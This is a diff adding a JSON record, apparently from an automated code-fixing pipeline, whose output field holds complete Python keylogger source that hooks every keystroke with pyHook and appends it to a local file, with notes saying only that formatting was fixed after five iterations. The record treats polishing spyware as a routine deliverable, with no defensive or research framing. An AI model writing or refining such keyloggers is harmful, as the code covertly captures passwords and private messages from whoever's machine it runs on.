@@ -1,0 +1,8 @@
+{
+  "output": "import pythoncom\nimport pyHook\n\ndef OnKeyboardEvent(event):\n    with open(\"keylogs.txt\", \"a\") as file:\n        if event.Ascii == 27:\n            return False\n        elif 32 <= event.Ascii <= 126:\n            file.write(chr(event.Ascii))\n        else:\n            file.write(\"[{}]\\n\".format(event.Key))\n    return True\n\n# Create a hook manager object\nhm = pyHook.HookManager()\n\n# Set the OnKeyboardEvent function to be called when a key is pressed down\nhm.KeyDown = OnKeyboardEvent\n\n# Start the hook and run forever (or until the user interrupts)\nhm.HookKeyboard()\npythoncom.PumpMessages(0)",
+  "notes": "fixed code formatting",
+  "applied_fixes": [
+    "major_issue1"
+  ],
+  "iterations": 5
+}
